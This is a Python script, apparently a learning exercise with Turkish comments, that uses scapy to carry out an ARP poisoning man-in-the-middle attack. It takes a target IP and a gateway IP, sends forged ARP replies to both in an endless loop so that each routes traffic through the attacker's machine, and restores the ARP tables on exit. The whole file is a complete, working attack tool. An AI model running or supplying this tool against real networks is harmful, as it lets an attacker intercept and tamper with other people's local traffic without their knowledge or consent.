import scapy.all as scapy
import time
import optparse



def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    broadcast_packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    combined_packet = broadcast_packet/arp_request_packet   #Sağdaki iki paketii soldaki tek pakette birleştir
    #Birleştirdikten sonra geriye yollamak ve birleştirmek kalıyor.
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]   #Cevap verilmeyince beklemeye devam et demektir.
    return answered_list[0][1].hwsrc


def arp_poisoning(target_ip,poisoned_ip):

    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)

def reset_operation(fooled_ip,gateway_ip):

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip)
    scapy.send(arp_response,verbose=False) #6 Defa çalıştır.

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t","--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")

    (options,arguments) = parse_object.parse_args()

    if not options.target_ip:
        print("Enter Target IP")
    if not options.gateway_ip:
        print("Enter Gateway IP")
    return options

user_ips = get_user_input()

if not user_ips.target_ip or not user_ips.gateway_ip:
    exit(1)
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip
number=0

try:
    while True:
        arp_poisoning(user_target_ip,user_gateway_ip) #Bu request ve response hedef sistemi kandıracak.
        arp_poisoning(user_gateway_ip,user_target_ip) #Bu request ve response modemi kandıracak.Böylelikle modem bizi hedef sistem olarak görecek.
        number +=2
        print("\rSending Packets: " +str(number),end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation(user_target_ip,user_gateway_ip)
    reset_operation(user_gateway_ip,user_target_ip)
